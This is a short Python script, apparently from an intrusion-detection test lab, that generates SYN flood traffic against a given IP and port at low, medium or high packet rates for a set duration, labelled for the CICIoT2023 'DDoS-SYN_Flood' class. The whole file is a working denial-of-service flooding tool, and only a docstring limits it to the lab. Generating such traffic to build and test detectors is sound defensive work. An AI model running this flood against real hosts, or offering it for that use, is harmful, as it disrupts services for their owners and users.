"""
DDoS SYN Flood — authorized lab testing only.
Generates TCP SYN packets to target for IDS detection testing.
Maps to CICIoT2023 class: DDoS-SYN_Flood
"""
import socket
import struct
import random
import time


def run(target_ip: str, duration: int = 30, intensity: str = 'medium',
        target_port: int = 80):
    """
    Generate SYN flood traffic against target.

    Args:
        target_ip: victim IP (must be within lab VPC)
        duration: seconds to run
        intensity: low/medium/high — controls packet rate
    """
    rates = {'low': 100, 'medium': 500, 'high': 2000}
    pps = rates.get(intensity, 500)
    delay = 1.0 / pps

    print(f"[SYN Flood] Target: {target_ip}:{target_port}")
    print(f"[SYN Flood] Duration: {duration}s, Rate: ~{pps} pps")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.01)

    sent = 0
    start = time.time()
    while time.time() - start < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.setblocking(False)
            try:
                s.connect_ex((target_ip, target_port))
            except Exception:
                pass
            s.close()
            sent += 1
            if sent % 100 == 0:
                elapsed = time.time() - start
                print(f"  [{elapsed:.0f}s] Sent {sent} SYN packets")
        except Exception:
            pass
        time.sleep(delay)

    elapsed = time.time() - start
    print(f"[SYN Flood] Complete: {sent} packets in {elapsed:.1f}s ({sent/elapsed:.0f} pps)")
    return sent
